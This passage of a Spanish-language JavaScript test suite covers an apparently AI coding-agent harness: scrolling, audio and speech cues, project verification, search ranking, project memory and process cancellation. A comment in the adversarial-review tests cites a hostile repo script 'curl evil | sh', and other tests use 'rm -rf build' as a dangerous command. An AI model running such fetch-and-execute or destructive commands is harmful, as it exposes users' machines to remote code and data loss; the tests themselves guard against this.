        if (prevDoc === undefined) delete globalThis.document; else globalThis.document = prevDoc;
    }
}

// ── scroller virtual ──────────────────────────────────────────────────────
section('scroller virtual');
{
    const { HeightTree } = await import('../ui/virtual-scroller.js');

    // El árbol de sumas es lo que hace viable un millón de filas: sin él, cada
    // altura corregida costaría recorrer la lista entera.
    const t = new HeightTree(1000, 20);
    eq('altura total inicial', t.total, 20000);
    eq('prefijo de las primeras 10', t.prefix(10), 200);
    eq('fila en el píxel 0', t.indexAt(0), 0);
    eq('fila en el píxel 205', t.indexAt(205), 10);

    // Corregir una altura no debe descuadrar nada de lo que hay debajo.
    t.set(5, 100);
    eq('total tras corregir', t.total, 20080);
    eq('prefijo antes de la corregida', t.prefix(5), 100);
    eq('prefijo después de la corregida', t.prefix(6), 200);
    eq('la búsqueda sigue siendo coherente', t.indexAt(t.prefix(7)), 7);

    // Coherencia exhaustiva con alturas irregulares.
    const r = new HeightTree(200, 10);
    let esperado = 0;
    for (let i = 0; i < 200; i++) { const h = 5 + (i * 7) % 43; r.set(i, h); esperado += h; }
    eq('total con alturas irregulares', r.total, esperado);
    let ok1 = true, acc = 0;
    for (let i = 0; i < 200; i++) {
        if (r.prefix(i) !== acc) { ok1 = false; break; }
        if (r.indexAt(acc) !== i) { ok1 = false; break; }
        acc += r.height(i);
    }
    ok('prefijos y búsqueda cuadran en las 200 filas', ok1);

    // Escala: un millón de filas debe responder al instante.
    const t0 = Date.now();
    const big = new HeightTree(1_000_000, 24);
    const construir = Date.now() - t0;
    const t1 = Date.now();
    for (let i = 0; i < 2000; i++) big.set((i * 977) % 1_000_000, 30 + (i % 50));
    for (let i = 0; i < 2000; i++) big.indexAt((i * 1237) % big.total);
    const operar = Date.now() - t1;
    ok('construir 1M filas es rápido', construir < 500, `${construir}ms`);
    ok('4000 operaciones sobre 1M filas son rápidas', operar < 500, `${operar}ms`);
    eq('la última fila es alcanzable', big.indexAt(big.total - 1), 999_999);

    // Casos límite que rompen una implementación ingenua.
    const vacio = new HeightTree(0, 20);
    eq('lista vacía: total 0', vacio.total, 0);
    const uno = new HeightTree(1, 20);
    eq('una sola fila', uno.indexAt(0), 0);
    eq('más allá del final se queda en la última', uno.indexAt(9999), 0);

    // push() incremental: el chat añade una entrada cada vez. Reconstruir el
    // árbol en cada push era O(n) por mensaje y colgaba la pestaña.
    const inc = new HeightTree(0, 20);
    const alturas = [];
    for (let i = 0; i < 3000; i++) { const h = 5 + (i * 13) % 97; alturas.push(h); inc.push(20); inc.set(i, h); }
    const directo = new HeightTree(3000, 20);
    for (let i = 0; i < 3000; i++) directo.set(i, alturas[i]);
    eq('push incremental da el mismo total', inc.total, directo.total);
    let mismos = true;
    for (let i = 0; i <= 3000 && mismos; i += 11) mismos = inc.prefix(i) === directo.prefix(i);
    ok('push incremental da los mismos prefijos', mismos);
    eq('push crece la cuenta', inc.n, 3000);

    const tPush = Date.now();
    const many = new HeightTree(0, 24);
    for (let i = 0; i < 200000; i++) many.push(24);
    ok('200k push son instantáneos', Date.now() - tPush < 300, `${Date.now() - tPush}ms`);
    eq('total tras 200k push', many.total, 4800000);
    eq('la última es alcanzable tras push', many.indexAt(many.total - 1), 199999);
}

// ── sonido ────────────────────────────────────────────────────────────────
section('sonido');
{
    const { SoundBoard, wireSound } = await import('../ui/sound.js');
    const { Bus: SndBus, EV: SndEV } = await import('../core/bus.js');

    // AudioContext de mentira: cuenta arranques sin emitir nada.
    let arrancados = 0;
    const nodo = () => ({
        buffer: null, loop: false,
        connect() {}, disconnect() {},
        start() { arrancados++; },
        stop() {}
    });
    const param = () => ({ value: 1, setValueAtTime() {}, linearRampToValueAtTime() {}, cancelScheduledValues() {} });

    globalThis.AudioContext = class {
        constructor() { this.state = 'running'; this.currentTime = 0; this.destination = {}; }
        async resume() { this.state = 'running'; }
        async close() {}
        createGain() { return { gain: param(), connect() {} }; }
        createBufferSource() { return nodo(); }
        async decodeAudioData() { return { duration: 1 }; }
    };
    const fetchReal = globalThis.fetch;
    let descargas = 0;
    globalThis.fetch = async () => { descargas++; return { ok: true, arrayBuffer: async () => new ArrayBuffer(8) }; };

    // Apagado: ni una descarga. Es la garantía de "coste cero si no lo quieres".
    const mudo = new SoundBoard({ enabled: false });
    await mudo.unlock();
    eq('apagado no descarga nada', descargas, 0);
    mudo.play('ok');
    eq('apagado no reproduce', arrancados, 0);

    const board = new SoundBoard({ enabled: true, volume: 0.5 });
    await board.unlock();
    eq('descarga los 7 clips una sola vez', descargas, 7);
    await board.unlock();
    eq('unlock repetido no vuelve a descargar', descargas, 7);

    // One-shots con límite de ritmo: una ráfaga no debe ametrallar.
    arrancados = 0;
    for (let i = 0; i < 50; i++) board.play('error');
    eq('50 errores seguidos suenan una vez', arrancados, 1);

    // Bucles: arrancan en la transición, no por token.
    arrancados = 0;
    for (let i = 0; i < 5000; i++) board.keepLooping('thinking');
    eq('5000 tokens arrancan UN bucle', arrancados, 1);
    ok('el bucle está sonando', board.loops.has('thinking'));

    // Y se paran solos cuando el flujo calla.
    board.lastTick.thinking = performance.now() - 10000;
    await new Promise(r => setTimeout(r, 220));
    ok('el bucle se corta tras el silencio', !board.loops.has('thinking'));
    ok('el vigilante se apaga al no quedar bucles', board.watchdog === null);

    // Cableado a los eventos reales.
    const bus = new SndBus();
    const sonados = [];
    const espia = {
        play: (n) => sonados.push(n),
        keepLooping: (n) => sonados.push(`loop:${n}`),
        stopLoop: (n) => sonados.push(`stop:${n}`),
        stopAll: () => sonados.push('stopAll')
    };
    wireSound(bus, espia, SndEV);

    bus.emit(SndEV.CHAT_THINK, { text: 'x' });
    ok('pensar lanza el bucle de thinking', sonados.includes('loop:thinking'));
    sonados.length = 0;

    bus.emit(SndEV.CHAT_DELTA, { text: 'y' });
    ok('escribir corta thinking y lanza typing', sonados.includes('stop:thinking') && sonados.includes('loop:typing'));
    sonados.length = 0;

    // Toda acción suena: leer también es actuar, y es lo que da el pulso.
    bus.emit(SndEV.TOOL_CALL, { name: 'read_file' });
    eq('leer un archivo es una acción y pita', sonados[0], 'exec');
    sonados.length = 0;
    bus.emit(SndEV.TOOL_CALL, { name: 'run_terminal_command' });
    eq('ejecutar un comando pita', sonados[0], 'exec');
    sonados.length = 0;

    bus.emit(SndEV.TOOL_RESULT, { ok: true, name: 'read_file' });
    eq('una lectura correcta no repite sonido', sonados.length, 0);
    bus.emit(SndEV.TOOL_RESULT, { ok: true, name: 'edit_file' });
    eq('una edición correcta sí se confirma', sonados[0], 'ok');
    sonados.length = 0;
    bus.emit(SndEV.TOOL_RESULT, { ok: false, name: 'edit_file' });
    eq('una herramienta fallida suena a error', sonados[0], 'error');
    sonados.length = 0;

    bus.emit(SndEV.STEP_START, { step: { id: 1 }, index: 0, total: 3, attempt: 1 });
    eq('empezar un paso suena a acción', sonados[0], 'exec');
    sonados.length = 0;

    bus.emit(SndEV.PLAN_APPROVED, { plan: {} });
    eq('aprobar el plan suena a acción', sonados[0], 'exec');
    sonados.length = 0;
    bus.emit(SndEV.PLAN_REJECTED, { reason: 'no' });
    eq('rechazar el plan avisa', sonados[0], 'warn');
    sonados.length = 0;

    bus.emit(SndEV.APPROVAL, { id: 'a' });
    eq('pedir permiso avisa', sonados[0], 'warn');
    sonados.length = 0;

    // Cancelar es pasar de trabajando a inactivo: eso debe sonar a parada.
    bus.emit(SndEV.STATE, { from: 'acting', to: 'idle' });
    ok('cancelar suena a warn', sonados.includes('warn'));
    sonados.length = 0;
    bus.emit(SndEV.STATE, { from: 'acting', to: 'paused' });
    ok('pausar suena a warn', sonados.includes('warn'));
    sonados.length = 0;
    bus.emit(SndEV.STATE, { from: 'idle', to: 'exploring' });
    ok('arrancar no suena a parada', !sonados.includes('warn'));
    sonados.length = 0;

    bus.emit(SndEV.ERROR, { message: 'x' });
    eq('el fallo del motor es crítico', sonados[0], 'critical');
    sonados.length = 0;

    bus.emit(SndEV.DONE, { progress: { failed: 0 } });
    ok('terminar bien: para todo y confirma', sonados.includes('stopAll') && sonados.includes('ok'));
    sonados.length = 0;

    bus.emit(SndEV.DONE, { progress: { failed: 2 } });
    ok('terminar con fallos suena a error', sonados.includes('error'));
    sonados.length = 0;

    bus.emit(SndEV.STATE, { from: 'acting', to: 'idle' });
    ok('al quedar inactivo se cortan los bucles', sonados.includes('stop:thinking') && sonados.includes('stop:typing'));

    // Un AudioContext roto no puede tumbar nada.
    globalThis.AudioContext = class { constructor() { throw new Error('sin audio'); } };
    const roto = new SoundBoard({ enabled: true });
    let explotó = false;
    try { await roto.unlock(); roto.play('ok'); roto.keepLooping('typing'); roto.stopAll(); }
    catch { explotó = true; }
    ok('un audio roto no lanza excepciones', !explotó);
    ok('y se marca como averiado', roto.broken === true);

    board.dispose();
    globalThis.fetch = fetchReal;
    delete globalThis.AudioContext;
}

// ── voz ───────────────────────────────────────────────────────────────────
section('voz');
{
    const { SpeechBoard, wireSpeech, speakable } = await import('../ui/speech.js');
    const { Bus: VBus, EV: VEV } = await import('../core/bus.js');

    // Lo que se lee en voz alta tiene que ser escuchable, no el markdown crudo.
    ok('el código no se lee verbatim', speakable('Mira:\n```js\nconst a=1;\nconst b=2;\n```\nlisto')
        .includes('bloque de código, 2 líneas'));
    eq('las rutas se leen por el nombre del archivo',
        speakable('Edité src/core/tools/fs-tools.js ahora'), 'Edité fs-tools.js ahora');
    eq('el énfasis de markdown desaparece', speakable('esto es **importante** y *esto* no'), 'esto es importante y esto no');
    eq('el código en línea conserva la palabra', speakable('usa `sum()` aquí'), 'usa sum() aquí');
    ok('los iconos y marcos no se pronuncian', !/[═──▸✓±]/.test(speakable('✓ paso 1 ── listo ± 3')));
    eq('el texto vacío no dice nada', speakable('   '), '');

    // Sintetizador de mentira: registra lo dicho sin emitir sonido.
    const dicho = [];
    let cancelaciones = 0;
    globalThis.speechSynthesis = {
        getVoices: () => ([
            { name: 'Helena', lang: 'es-ES', localService: true },
            { name: 'Zira', lang: 'en-US', localService: true }
        ]),
        speak: (u) => dicho.push({ text: u.text, voice: u.voice && u.voice.name, rate: u.rate }),
        cancel: () => { cancelaciones++; },
        addEventListener: () => {}
    };
    globalThis.SpeechSynthesisUtterance = class {
        constructor(t) { this.text = t; this.voice = null; this.lang = ''; this.rate = 1; this.pitch = 1; this.volume = 1; }
    };

    const sp = new SpeechBoard({ enabled: true, verbosity: 'key', rate: 1.2 });
    eq('ordena las voces con el español primero', sp.listVoices()[0].name, 'Helena');

    sp.say('hola mundo');
    eq('habla', dicho.length, 1);
    eq('elige la voz española por defecto', dicho[0].voice, 'Helena');
    eq('respeta la velocidad configurada', dicho[0].rate, 1.2);
    dicho.length = 0;

    // Verbosidad: 'all' no debe sonar si estamos en 'key'.
    sp.say('detalle menor', { level: 'all' });
    eq('lo secundario se calla en modo key', dicho.length, 0);
    sp.configure({ verbosity: 'all' });
    sp.say('detalle menor', { level: 'all' });
    eq('lo secundario se oye en modo all', dicho.length, 1);
    sp.configure({ verbosity: 'key' });
    dicho.length = 0;

    // Streaming por frases: no debe hablar a mitad de frase.
    sp.stream('El archivo tiene un error');
    eq('no habla sin terminar la frase', dicho.length, 0);
    sp.stream(' de sintaxis. ');
    eq('habla al cerrar la frase', dicho.length, 1);
    ok('la frase llega entera', dicho[0].text.includes('error de sintaxis'));
    dicho.length = 0;
    sp.stream('cola sin punto');
    eq('la cola queda pendiente', dicho.length, 0);
    sp.flush();
    eq('flush suelta la cola', dicho.length, 1);
    dicho.length = 0;

    // Interrumpir: un permiso no puede esperar en la cola.
    cancelaciones = 0;
    sp.say('urgente', { interrupt: true });
    eq('interrumpir cancela lo anterior', cancelaciones, 1);
    dicho.length = 0;

    // Apagada no dice nada.
    sp.setEnabled(false);
    sp.say('nada'); sp.stream('nada. ');
    eq('apagada no habla', dicho.length, 0);
    sp.setEnabled(true);

    // verbosity 'off' equivale a apagada.
    sp.configure({ verbosity: 'off' });
    sp.say('nada');
    eq('verbosidad off no habla', dicho.length, 0);
    sp.configure({ verbosity: 'key' });
    dicho.length = 0;

    // Cableado a los eventos.
    const bus = new VBus();
    const dichos = [];
    const espia = {
        active: true,
        say: (t, o) => dichos.push({ t, interrupt: !!(o && o.interrupt), level: (o && o.level) || 'key' }),
        stream: () => {}, flush: () => {}, stop: () => dichos.push({ t: '[stop]' })
    };
    wireSpeech(bus, espia, VEV);

    bus.emit(VEV.PLAN_DRAFT, { plan: { goal: 'Arreglar sum', steps: [{ id: 1, title: 'Editar' }, { id: 2, title: 'Probar' }] } });
    ok('lee el plan completo', dichos[0].t.includes('Arreglar sum') && dichos[0].t.includes('2 pasos'));
    ok('dice cómo aprobarlo', dichos[0].t.includes('aprobar'));
    dichos.length = 0;

    bus.emit(VEV.APPROVAL, { command: 'rm -rf build', risk: 'dangerous', title: 'x' });
    ok('el permiso interrumpe', dichos[0].interrupt === true);
    ok('el permiso dice el comando', dichos[0].t.includes('rm -rf build'));
    ok('avisa de que es peligroso', dichos[0].t.includes('peligroso'));
    dichos.length = 0;

    bus.emit(VEV.STEP_DONE, { step: { id: 1, summary: 'hecho' } });
    ok('anuncia el paso completado', dichos[0].t.includes('Paso 1 completado'));
    dichos.length = 0;

    bus.emit(VEV.ERROR, { message: 'todo mal' });
    ok('el error grave interrumpe', dichos[0].interrupt === true && dichos[0].t.includes('todo mal'));
    dichos.length = 0;

    bus.emit(VEV.TOOL_CALL, { name: 'read_file', args: { path: 'src/a.js' } });
    eq('narrar herramientas es de nivel all', dichos[0].level, 'all');
    ok('describe la acción en lenguaje natural', dichos[0].t === 'Leyendo a.js');
    dichos.length = 0;

    bus.emit(VEV.DONE, { progress: { done: 2, total: 2, failed: 0 }, changed: [{ path: 'a' }] });
    ok('cierra con el resumen', dichos.some(d => d.t.includes('Terminado') && d.t.includes('1 archivo modificado')));

    // Sin API de voz, nada puede explotar.
    delete globalThis.speechSynthesis;
    const sinVoz = new SpeechBoard({ enabled: true });
    let explotó = false;
    try { sinVoz.say('x'); sinVoz.stream('y. '); sinVoz.flush(); sinVoz.stop(); } catch { explotó = true; }
    ok('sin síntesis de voz no lanza excepciones', !explotó);
    ok('y se marca como no disponible', sinVoz.broken === true);

    delete globalThis.SpeechSynthesisUtterance;
}

// ── verificación de proyecto: qué comando, y de dónde sale ────────────────
// Es el ajuste que decide qué significa "paso completado". Sin comando sólo se
// comprueba que el archivo sigue siendo JavaScript; con él, que sigue
// funcionando. De ahí que importe tanto cuál se elige — y cuál NO se elige solo.
section('verify/comando de proyecto');
{
    const mkVerifier = (cfg, testCommand) => new Verifier({
        platform: { exec: async () => ({ stdout: '', stderr: '', exitCode: 0, timedOut: false, aborted: false, durationMs: 1 }) },
        config: { get: (k, fb) => (k in cfg ? cfg[k] : fb) },
        security: { classifyCommand: () => ({ risk: 'caution' }) },
        logger: null,
        repoMap: testCommand === null ? null : { cache: { conventions: { testCommand } } }
    });

    eq('lo configurado manda',
        mkVerifier({ 'agent.verifyCommand': 'npm run check' }, 'npm test').resolveCommand().command,
        'npm run check');

    const detectado = mkVerifier({}, 'npm test').resolveCommand();
    eq('sin configurar se usa el detectado', detectado.command, 'npm test');
    eq('y se dice de dónde salió', detectado.source, 'detectado');

    eq('se puede desactivar la detección',
        mkVerifier({ 'agent.verifyCommandAuto': false }, 'npm test').resolveCommand().command, '');
    eq('sin mapa no se inventa nada', mkVerifier({}, null).resolveCommand().command, '');

    // La lista cerrada es el freno: algo detectado en el repositorio no se
    // ejecuta solo por el hecho de haber sido detectado.
    const raro = mkVerifier({}, 'node scripts/deploy-produccion.js').resolveCommand();
    eq('un comando arbitrario detectado NO se ejecuta', raro.command, '');
    ok('y se explica por qué', /deploy-produccion/.test(raro.rejected || ''), raro.rejected);

    // Cancelar durante la verificación no es un fallo del paso.
    const cancelado = new Verifier({
        platform: { exec: async () => ({ stdout: '', stderr: '', exitCode: -1, timedOut: false, aborted: true, durationMs: 5 }) },
        config: { get: (k, fb) => ({ 'workspace.root': 'C:/Repo', 'agent.verifyCommand': 'npm test' })[k] ?? fb },
        security: { classifyCommand: () => ({ risk: 'caution' }) },
        logger: null
    });
    const veredicto = await cancelado.projectCheck({});
    eq('una verificación cancelada no se marca como fallo', veredicto.ran, false);
    ok('y lo dice', /cancel/i.test(veredicto.reason), veredicto.reason);

    // El signal tiene que llegar hasta exec, que es lo único capaz de matar el
    // proceso. Sin esto, Cancelar para al agente y deja corriendo los tests.
    let vistoSignal = null;
    const espia = new Verifier({
        platform: {
            exec: async (_cmd, opts) => {
                vistoSignal = opts.signal;
                return { stdout: '', stderr: '', exitCode: 0, timedOut: false, durationMs: 1 };
            }
        },
        config: { get: (k, fb) => ({ 'workspace.root': 'C:/Repo', 'agent.verifyCommand': 'npm test' })[k] ?? fb },
        security: { classifyCommand: () => ({ risk: 'caution' }) },
        logger: null
    });
    const ac = new AbortController();
    await espia.projectCheck({ signal: ac.signal });
    ok('el signal llega a platform.exec', vistoSignal === ac.signal);
}

// ── el "test" de mentira que deja npm init ────────────────────────────────
// `npm init` escribe "test": "echo ... && exit 1". Tomar eso por el comando de
// tests haría fallar TODAS las verificaciones de un proyecto que simplemente no
// tiene tests, y el fallo parecería del agente.
section('repo-map/comando de tests');
{
    const { RepoMap } = await import('../core/repo-map.js');

    const conPkg = (pkg, extra = []) => {
        const files = [{ rel: 'package.json', path: 'C:/R/package.json' }, ...extra];
        const map = new RepoMap({
            platform: {
                fs: {
                    readText: async (p) => (p.endsWith('package.json') ? JSON.stringify(pkg) : ''),
                    stat: async () => ({ isFile: true, size: 10 })
                }
            },
            config: { get: (k, fb) => fb }, bus: null, logger: null
        });
        return map.detectConventions('C:/R', files, null);
    };

    const plantilla = await conPkg({ scripts: { test: 'echo "Error: no test specified" && exit 1' } });
    eq('el test de plantilla de npm no cuenta', plantilla.data.testCommand, '');

    const real = await conPkg({ scripts: { test: 'node --test' } });
    eq('un test de verdad sí', real.data.testCommand, 'npm test');

    const conPnpm = await conPkg(
        { scripts: { test: 'vitest run' } },
        [{ rel: 'pnpm-lock.yaml', path: 'C:/R/pnpm-lock.yaml' }]
    );
    eq('se respeta el gestor de paquetes', conPnpm.data.testCommand, 'pnpm test');

    eq('sin script de test no hay comando', (await conPkg({})).data.testCommand, '');
}

// ── búsqueda: las definiciones primero ────────────────────────────────────
// El cupo se llenaba recorriendo en orden alfabético, así que buscar un símbolo
// devolvía sus importaciones y no su declaración. El modelo leía eso como "no
// existe" y se lo inventaba: justo el fallo que esta herramienta debe impedir.
section('search/orden de resultados');
{
    const { searchCodebase } = await import('../core/tools/search-tools.js');

    // `aaa-usa.js` gana por alfabeto; `zzz-define.js` tiene la declaración.
    const ficheros = {
        'C:/R/aaa-usa.js': "import { objetivo } from './zzz-define.js';\nobjetivo();\nobjetivo();\n",
        'C:/R/mmm-tambien.js': 'const x = objetivo(1);\n',
        'C:/R/zzz-define.js': 'export function objetivo(n) {\n    return n;\n}\n'
    };

    const ctx = {
        root: 'C:/R',
        signal: null,
        config: { get: (k, fb) => fb },
        platform: {
            fs: {
                stat: async (p) => (ficheros[p] ? { isFile: true, isDirectory: false, size: ficheros[p].length } : null),
                readText: async (p) => ficheros[p] || '',
                readDir: async (p) => (p === 'C:/R'
                    ? Object.keys(ficheros).map(path => ({ name: P.basename(path), path, isDirectory: false }))
                    : [])
            }
        }
    };

    const r = await searchCodebase.run({ query: 'objetivo', max_results: 10 }, ctx);
    ok('encuentra el símbolo', r.ok && r.data.matches.length > 0, r.summary);
    eq('la definición va primera', r.data.matches[0].rel, 'zzz-define.js');
    ok('y viene marcada', r.data.matches[0].definition === true);
    ok('el resumen cuenta las definiciones', /definici/i.test(r.summary), r.summary);
    ok('el detalle la señala', r.detail.includes('DEFINICIÓN'));
    ok('y apunta a leerla', r.detail.includes('read_file(path="zzz-define.js", around_line=1)'), r.detail.slice(-160));

    // Un texto libre no es un símbolo: no debe marcar nada.
    const libre = await searchCodebase.run({ query: 'return n', max_results: 5 }, ctx);
    ok('un texto libre no inventa definiciones', libre.data.matches.every(m => !m.definition));

    // Lo que de verdad estaba roto: el recorte ocurre DESPUÉS de ordenar.
    const uno = await searchCodebase.run({ query: 'objetivo', max_results: 1 }, ctx);
    eq('con cupo de 1 sobrevive la definición', uno.data.matches[0].rel, 'zzz-define.js');
}

// ── símbolos estructurados ────────────────────────────────────────────────
section('repo-map/símbolos');
{
    const js = 'export function alfa(a) {}\nclass Beta {\n  gama(x) {}\n}\n';
    const syms = extractSymbols(js, 'javascript');
    eq('devuelve nombre y línea', [syms[0].name, syms[0].line], ['alfa', 1]);
    ok('incluye la firma', syms[0].signature.includes('function alfa'));
    ok('encuentra la clase', syms.some(s => s.name === 'Beta' && s.line === 2));

    // La forma antigua no cambia: el mapa del proyecto depende de ella.
    ok('extractSignatures conserva su formato', /·1$/.test(extractSignatures(js, 'javascript')[0]));

    // El tope se puede subir porque la búsqueda necesita ver una declaración
    // esté donde esté, no sólo entre las primeras del archivo.
    const muchos = Array.from({ length: 60 }, (_, i) => `function f${i}() {}`).join('\n');
    eq('tope por defecto', extractSymbols(muchos, 'javascript').length, 40);
    eq('tope ampliable', extractSymbols(muchos, 'javascript', { limit: 100 }).length, 60);
}

// ── memoria del proyecto ──────────────────────────────────────────────────
// El arnés era amnésico: repetía el paso que ya había fallado y volvía a
// proponer el comando que ya le habían rechazado.
section('memoria del proyecto');
{
    const disco = new Map();
    const platform = {
        fs: {
            readText: async (p) => { if (!disco.has(p)) throw new Error('ENOENT'); return disco.get(p); },
            writeText: async (p, c) => { disco.set(p, c); }
        }
    };
    const cfg = (over = {}) => ({ get: (k, fb) => ({ 'workspace.root': 'C:/R', ...over }[k] ?? fb) });

    const mem = new ProjectMemory({ platform, config: cfg(), logger: null });
    eq('sin archivo no hay bloque', mem.block(), '');

    const plan = createPlan('arreglar el parser', [
        { title: 'leer el parser', description: 'd', verify: 'v' },
        { title: 'corregir la fecha', description: 'd', verify: 'v' }
    ]);
    plan.steps[0].status = STEP_STATUS.DONE;
    plan.steps[0].attempts = 1;
    plan.steps[1].status = STEP_STATUS.FAILED;
    plan.steps[1].attempts = 3;
    plan.steps[1].notes.push('old_text no aparece en src/fecha.js');

    await mem.record({
        task: 'arreglar el parser de fechas',
        plan,
        changes: [{ path: 'src/fecha.js', added: 4, removed: 2 }],
        verification: { ran: true, ok: false, command: 'npm test', exitCode: 1 },
        rejectedCommands: ['git push origin main']
    });

    const escrito = disco.get('C:/R/.rubus/memory.md');
    ok('escribe en .rubus/memory.md', !!escrito);
    ok('anota la tarea', escrito.includes('arreglar el parser de fechas'));
    ok('anota el resultado', /1\/2 pasos, 1 fallidos/.test(escrito), escrito);
    ok('anota la verificación', escrito.includes('npm test'));
    ok('anota el archivo tocado', escrito.includes('src/fecha.js'));
    ok('anota lo que costó', escrito.includes('old_text no aparece'));
    ok('anota el comando rechazado', escrito.includes('git push origin main'));
    ok('NO anota el paso que salió a la primera', !escrito.includes('leer el parser'), escrito);

    // El caso real: otra ejecución, otra instancia, misma carpeta.
    const otra = new ProjectMemory({ platform, config: cfg(), logger: null });
    await otra.load({ force: true });
    const bloque = otra.block();
    ok('la ejecución siguiente la lee', bloque.includes('arreglar el parser de fechas'));
    ok('se presenta como contexto, no como órdenes', /manda el c[óo]digo/i.test(bloque));

    // Tope duro: una memoria sin límite sólo traslada el problema del contexto.
    for (let i = 0; i < 20; i++) {
        await otra.record({
            task: `tarea numero ${i}`,
            plan: createPlan(`t${i}`, [{ title: 't', description: 'd', verify: 'v' }]),
            changes: []
        });
    }
    const entradas = (disco.get('C:/R/.rubus/memory.md').match(/^## /gm) || []).length;
    ok('el archivo tiene tope', entradas <= 12, `${entradas} entradas`);
    ok('conserva lo más reciente', disco.get('C:/R/.rubus/memory.md').includes('tarea numero 19'));

    // Y el bloque del prompt tiene su propio tope, más estrecho.
    ok('el bloque inyectado va acotado', estimateTokens(otra.block()) < 900, `${estimateTokens(otra.block())} tokens`);

    // Desactivable, y de verdad.
    const apagada = new ProjectMemory({ platform, config: cfg({ 'agent.memory': false }), logger: null });
    await apagada.load({ force: true });
    eq('apagada no aporta bloque', apagada.block(), '');
    eq('apagada no escribe', await apagada.record({ task: 'x', plan, changes: [] }), false);

    // Un fallo al escribir no puede tumbar una ejecución que acaba de ir bien.
    const roto = new ProjectMemory({
        platform: {
            fs: {
                readText: async () => { throw new Error('ENOENT'); },
                writeText: async () => { throw new Error('disco lleno'); }
            }
        },
        config: cfg(), logger: null
    });
    eq('un disco lleno no lanza', await roto.record({ task: 'x', plan, changes: [] }), false);
}

// ── cancelar en el shell de escritorio ────────────────────────────────────
// `spawnProcess` se espera con await, así que hay una ventana real entre pedir
// el proceso y tener su id. Cancelar dentro de esa ventana ejecutaba el kill
// cuando todavía no había nada que matar, y el proceso nacía un instante
// después ya sin nadie que fuera a pararlo: un `npm install` huérfano detrás de
// una ventana, invisible, que es la peor versión del fallo.
section('neutralino/cancelar');
{
    const { createNeutralinoPlatform } = await import('../platform/neutralino.js');

    /** Un Neutralino de mentira con un spawn deliberadamente lento. */
    const mockNL = ({ spawnDelayMs = 0 } = {}) => {
        const matados = [];
        let siguienteId = 1;
        globalThis.Neutralino = {
            events: { on: () => {} },
            os: {
                async spawnProcess() {
                    if (spawnDelayMs) await new Promise(r => setTimeout(r, spawnDelayMs));
                    return { id: siguienteId++ };
                },
                async updateSpawnedProcess(id, accion) { matados.push(`${id}:${accion}`); }
            }
        };
        return matados;
    };

    const previo = globalThis.Neutralino;
    try {
        // Cancelar MIENTRAS se lanza: el caso que se escapaba.
        const matados = mockNL({ spawnDelayMs: 60 });
        const plat = createNeutralinoPlatform();
        const ac = new AbortController();
        const corriendo = plat.exec('npm install', { signal: ac.signal, timeoutMs: 10000 });
        await new Promise(r => setTimeout(r, 20));   // dentro de la ventana del spawn
        ac.abort();
        const r = await corriendo;

        eq('cancelar durante el spawn se reporta', r.aborted, true);
        // Lo que de verdad importa: que el proceso reciba el exit una vez existe.
        await new Promise(r2 => setTimeout(r2, 80));
        ok('el proceso nacido tras el abort SÍ se mata', matados.includes('1:exit'), JSON.stringify(matados));
        eq('y se mata una sola vez', matados.filter(m => m === '1:exit').length, 1);

        // Cancelar con el proceso ya en marcha: el camino normal.
        const matados2 = mockNL({ spawnDelayMs: 0 });
        const plat2 = createNeutralinoPlatform();
        const ac2 = new AbortController();
        const corriendo2 = plat2.exec('npm test', { signal: ac2.signal, timeoutMs: 10000 });
        await new Promise(r2 => setTimeout(r2, 30));
        ac2.abort();
        const r2 = await corriendo2;
        eq('cancelar en marcha se reporta', r2.aborted, true);
        ok('y mata el proceso', matados2.includes('1:exit'), JSON.stringify(matados2));

        // Cancelado de antemano: ni siquiera se lanza.
        const matados3 = mockNL();
        const plat3 = createNeutralinoPlatform();
        const yaAbortado = new AbortController();
        yaAbortado.abort();
        const r3 = await plat3.exec('npm test', { signal: yaAbortado.signal });
        eq('con el signal ya abortado no se lanza nada', r3.aborted, true);
        eq('y no hay nada que matar', matados3.length, 0);
    } finally {
        globalThis.Neutralino = previo;
    }
}

// ── lo que encontró la revisión adversarial ───────────────────────────────
// Seis fallos reales del primer intento de estas mejoras. Cada uno tiene aquí
// el escenario con el que se demostró, porque los tres primeros son la clase
// de cosa que vuelve sola si alguien "simplifica" la verificación.
section('revisión/verificación de proyecto');
{
    const mkExec = (respuestas) => {
        const llamadas = [];
        let i = 0;
        return {
            llamadas,
            exec: async (cmd, opts) => {
                llamadas.push({ cmd, signal: opts?.signal });
                const r = respuestas[Math.min(i++, respuestas.length - 1)];
                return { stdout: '', stderr: '', exitCode: r, timedOut: false, aborted: false, durationMs: 1 };
            }
        };
    };
    // Por defecto 'manual' en estas pruebas: el modo automático se comprueba
    // aparte, y mezclarlos haría que la mitad de las aserciones no dijeran nada.
    const mkV = (spy, over = {}) => new Verifier({
        platform: { exec: spy.exec },
        config: { get: (k, fb) => ({ 'workspace.root': 'C:/R', 'agent.approvalMode': 'manual', ...over }[k] ?? fb) },
        security: { classifyCommand: () => ({ risk: 'caution' }) },
        logger: null,
        repoMap: { cache: { conventions: { testCommand: 'npm test' } } }
    });

    // `npm test` no es un comando: es una indirección a scripts.test del
    // repositorio analizado, que es contenido sin auditar. Filtrar la cadena no
    // filtra lo que se ejecuta, así que un comando DETECTADO tiene que pasar por
    // el mismo diálogo que cualquier otro. Un repositorio hostil con
    // {"test": "curl evil | sh"} llegaba a exec sin preguntar nada.
    {
        const spy = mkExec([0]);
        const v = mkV(spy);
        const r = await v.projectCheck({});          // sin aprobador
        eq('un comando detectado NO se ejecuta sin que haya quien lo apruebe', spy.llamadas.length, 0);
        eq('y se dice por qué', r.ran, false);
        ok('mencionando el comando', /no autoriz/i.test(r.reason), r.reason);
    }
    {
        const spy = mkExec([0]);
        const v = mkV(spy);
        const pedidas = [];
        const aprobar = async (req) => { pedidas.push(req); return true; };
        await v.projectCheck({ requestApproval: aprobar });
        await v.projectCheck({ requestApproval: aprobar });
        eq('aprobado se ejecuta', spy.llamadas.length, 2);
        eq('pero sólo se pregunta una vez por comando', pedidas.length, 1);
        ok('el diálogo avisa de que es código del repositorio', /repositorio/i.test(pedidas[0]?.detail || ''), JSON.stringify(pedidas[0] || null));
    }
    {
        const spy = mkExec([0]);
        const v = mkV(spy);
        const pedidas = [];
        await v.projectCheck({ requestApproval: async (req) => { pedidas.push(req); return false; } });
        eq('rechazado no se ejecuta', spy.llamadas.length, 0);
        await v.projectCheck({ requestApproval: async (req) => { pedidas.push(req); return true; } });
        eq('y no se vuelve a preguntar en la misma ejecución', pedidas.length, 1);
        eq('sigue sin ejecutarse', spy.llamadas.length, 0);
    }
    {
        // Lo que el usuario escribió a mano ya está autorizado por haberlo escrito.
        const spy = mkExec([0]);
